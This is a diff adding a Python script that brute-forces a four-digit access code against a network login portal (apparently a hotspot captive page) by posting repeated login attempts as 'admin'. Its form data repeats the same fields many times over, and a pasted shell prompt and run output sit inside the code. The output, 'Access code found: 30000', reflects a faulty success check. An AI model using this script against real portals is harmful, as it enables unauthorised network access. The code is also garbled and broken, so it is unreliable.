@@ -1,0 +1,18 @@
+import requests
+
+def brute_force_access_code(base_url, access_code_prefix):
+    for code in range(10000):
+        padded_code = str(code).zfill(4)  # Pad with leading zeros if necessary
+        access_code = access_code_prefix + padded_code
+        data = {'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': '', 'login': 'Login', 'dst': '', 'popup': 'true', 'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': '', 'login': 'Login', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': '', 'login': 'Login', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': '', 'login': 'Login', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': '', 'login': 'Login', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'dst': '', 'popup': 'true', 'username': 'admin', 'password': '', 'dst': '', 'popup': 'true', 'chap-id': '0', 'chap-challenge': '', 'link-login-only': 'yes', 'link-orig': 'login', 'mac-esc': '', 'mac-cookie': '', 'user': 'admin', 'pass': access_code, 'login': 'Login'}
+        response = requests.post(base_url, data=data)
+        if "Login failed" not in response.text:
+            print(f"Access code found: {access_code}")
+            break
+
+if __name__ == "__main__":
+    base_url = "http://m.net/index.html"
+    access_code_prefix = "3"
+    brute_force_access_code(base_url, access_code_prefix)
+    C:\Users\Owner\PycharmProjects\pythonProject1 > python bbbt.py
+    Access code found: 30000
